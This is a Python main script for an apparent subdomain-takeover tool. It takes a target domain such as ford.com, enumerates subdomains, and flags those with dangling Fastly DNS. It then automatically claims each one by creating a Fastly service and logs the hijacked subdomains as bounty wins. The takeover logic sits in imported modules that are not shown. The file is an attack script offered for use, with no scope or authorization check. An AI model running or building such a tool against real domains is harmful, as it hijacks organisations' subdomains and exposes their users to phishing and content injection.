# src/main.py (THE HUNTER VERSION - PATH FIXED)
import sys
import os
import time

# --- 369 PATH FIX (Ye line 'ModuleNotFoundError' ko khatam karegi) ---
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
# ---------------------------------------------------------------------

from src.core.utils import print_emaz, banner
from src.modules.sub_hunter import discover_subdomains
from src.modules.dns_analyzer import analyze_dns
from src.modules.fastly_api import create_service

def main():
    banner()
    
    # 1. Input: Master Domain (e.g., ford.com)
    print_emaz("369 Logic Engaged. Ready for Hunting.", "INFO")
    master = input("\nEnter Master Domain to Hunt (e.g., ford.com): ")
    
    # 2. Step: Discovery
    potential_targets = discover_subdomains(master)
    
    # 3. Step: Analysis & Action
    for target in potential_targets:
        print_emaz(f"Analyzing {target}...", "INFO")
        
        # Check if it's a Fastly Ghost
        if analyze_dns(target):
            print_emaz(f"Target {target} is VULNERABLE! Starting Takeover...", "SUCCESS")
            
            # 4. Step: Auto-Takeover
            link = create_service(target)
            
            if link:
                print_emaz(f"BOUNTY READY: {link}", "SUCCESS")
                # Save to Success Log
                log_path = os.path.join("data", "success_logs.json")
                with open(log_path, "a") as f:
                    f.write(f"WIN: {target} -> {link}\n")
        
        time.sleep(0.3) # 369 Micro-delay

if __name__ == "__main__":
    main()